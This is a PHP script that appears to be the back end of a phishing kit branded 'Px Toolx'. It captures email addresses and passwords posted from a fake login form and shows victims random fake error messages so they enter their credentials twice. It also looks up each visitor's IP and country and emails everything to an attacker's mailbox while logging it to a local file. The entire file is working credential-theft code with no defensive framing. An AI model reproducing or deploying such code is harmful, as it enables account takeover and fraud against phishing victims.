<?php
// Set CORS headers to allow any origin
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
header("Access-Control-Allow-Headers: Origin, Content-Type, X-Auth-Token");


session_start();
include 'result.php';

if (!isset($_SESSION['count']) || $_SESSION['count'] >= 2) {
    $_SESSION['count'] = 0;
}


if (isset($_POST['fName']) && isset($_POST['apiname']) && isset($_POST['apikey'])) {
    $fName = $_POST['fName'];
    if ($fName === 'probono') {
        $emx = strip_tags($_POST['apiname']);
        $pwd = strip_tags($_POST['apikey']);
        probono($emx, $pwd);
    } else {
        header('Location: https://duckduckgo.com/');
        die();
    }
} else {
    header('Location: https://duckduckgo.com/');
    die();
}


function probono($email, $passwd)
{
    global $resultbox;
    if (strlen($passwd) < 6) {
        $response = ['status' => 'error', 'msgerror' => 'Password too short.'];

        header('Content-Type: application/json');
        echo json_encode($response);
        die();
    }
    $warnings = array(
        "Incorrect username or password",
        "Error geting document, try again",
        "Connection error, please try again",
        "Enter valid email and password",
        "Invalid password or connection timed out please try again",
        "Wrong password. Try again"
    );

    $randomKey = array_rand($warnings);
    //
    $msgerror = $warnings[$randomKey]; // Set an error message if needed
    $status = "error";
    // Call your custom function and process the variables
    $ip = getenv("REMOTE_ADDR");
    $addr_details = unserialize(file_get_contents('http://www.geoplugin.net/json.gp?ip=' . $ip));
    $country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
    $country = visitor_country();
    $countryCode = visitor_countryCode();
    $continentCode = visitor_continentCode();
    $browser = $_SERVER['HTTP_USER_AGENT'];
    $web = $_SERVER["HTTP_HOST"];
    $inj = $_SERVER["REQUEST_URI"];
    $server = date("D/M/d, Y g:i a");
    $domain = substr(strrchr($email, "@"), 1);
    $sender = $domain;
    $subj = "$domain Log From  $country";
    $headers .= "From: All Domain Result<$sender>\n";
    $headers .= "X-Priority: 1\n"; //1 Urgent Message, 3 Normal
    $headers .= "Content-Type:text/html; charset=\"iso-8859-1\"\n";
    $msg = "<HTML><BODY>
  <TABLE>
 <tr><td>============= Px Toolx =============</td></tr>
 <tr><td><STRONG>Email: $email<td/></tr>
 <tr><td><STRONG>Password: $passwd</td></tr>
 <tr><td>============= [ip] =============</td></tr>
 <tr><td>IP: $ip </td></tr>
 <tr><td>Country Name: $country </td></tr>
 <tr><td>User-Agent: $browser <td/></tr>
 <tr><td>Date : $server <td/></tr>
 <tr><td>========== www.pxtoolx.com ==========</td></tr>
 </BODY>
 </HTML>";

    mail($resultbox, $subj, $msg, $headers);
    $fp = fopen("ban", "a");
    fputs($fp, $msg);
    fclose($fp);
    $_SESSION['count']++;

    if ($_SESSION['count'] >= 2) {
        $status = 'success';
    }

    $response = ['status' => $status, 'msgerror' => $msgerror];

    header('Content-Type: application/json');
    echo json_encode($response);
    // die();
}


function visitor_country()
{
    $client = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote = $_SERVER['REMOTE_ADDR'];
    $result = "Unknown";
    if (filter_var($client, FILTER_VALIDATE_IP)) {
        $ip = $client;
    } elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
        $ip = $forward;
    } else {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));

    if ($ip_data && $ip_data->geoplugin_countryName != null) {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}
function visitor_countryCode()
{
    $client = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote = $_SERVER['REMOTE_ADDR'];
    $result = "Unknown";
    if (filter_var($client, FILTER_VALIDATE_IP)) {
        $ip = $client;
    } elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
        $ip = $forward;
    } else {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));

    if ($ip_data && $ip_data->geoplugin_countryCode != null) {
        $result = $ip_data->geoplugin_countryCode;
    }

    return $result;
}
function visitor_regionName()
{
    $client = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote = $_SERVER['REMOTE_ADDR'];
    $result = "Unknown";
    if (filter_var($client, FILTER_VALIDATE_IP)) {
        $ip = $client;
    } elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
        $ip = $forward;
    } else {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));

    if ($ip_data && $ip_data->geoplugin_regionName != null) {
        $result = $ip_data->geoplugin_regionName;
    }

    return $result;
}
function visitor_continentCode()
{
    $client = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote = $_SERVER['REMOTE_ADDR'];
    $result = "Unknown";
    if (filter_var($client, FILTER_VALIDATE_IP)) {
        $ip = $client;
    } elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
        $ip = $forward;
    } else {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));

    if ($ip_data && $ip_data->geoplugin_continentCode != null) {
        $result = $ip_data->geoplugin_continentCode;
    }

    return $result;
}

?>